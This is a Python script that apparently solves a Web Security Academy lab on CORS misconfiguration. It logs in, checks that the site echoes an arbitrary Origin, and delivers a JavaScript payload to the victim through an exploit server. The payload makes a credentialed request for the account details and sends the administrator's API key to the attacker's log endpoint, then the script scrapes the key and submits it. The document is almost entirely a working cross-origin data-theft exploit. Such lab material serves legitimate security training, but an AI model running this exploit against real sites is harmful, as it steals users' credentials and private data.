import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = 'acc51ff71fcc4b4b80a298c2003d003e.web-security-academy.net'

login_url = f"https://{site}/login"
login_response = s.get(login_url)
csrf = BeautifulSoup(login_response.text,'html.parser').find('input', {'name':'csrf'})['value']

login_data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter'
}

resp = s.post(login_url,data=login_data)

s.headers.update({'Origin':'https://spurgeonc.com'})

details_url = f"https://{site}/accountDetails"
resp = s.get(details_url)

# View the response headers showing the Origin is echoed
print(resp.headers)

# Get the response containing the API key
print(resp.text)

exploit_html = '''<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acc51ff71fcc4b4b80a298c2003d003e.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script> '''

exploit_url = 'https://ac7e1f9b1fb24b83804198e901e8009f.web-security-academy.net/'

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(exploit_url, data=formData)

log_url = f'{exploit_url}/log'
resp = s.get(log_url)
soup = BeautifulSoup(resp.text,'html.parser')
pretext = soup.find('pre').text.split('\n')
admin_entries = [line for line in pretext if 'administrator' in line]
print(admin_entries[0])

log_entries = admin_entries[0].split('%22')
print(log_entries)
print(log_entries[11])

submit_url = f'https://{site}/submitSolution'
solution_data = {
  'answer' : {log_entries[11]}
}
s.post(submit_url, data=solution_data)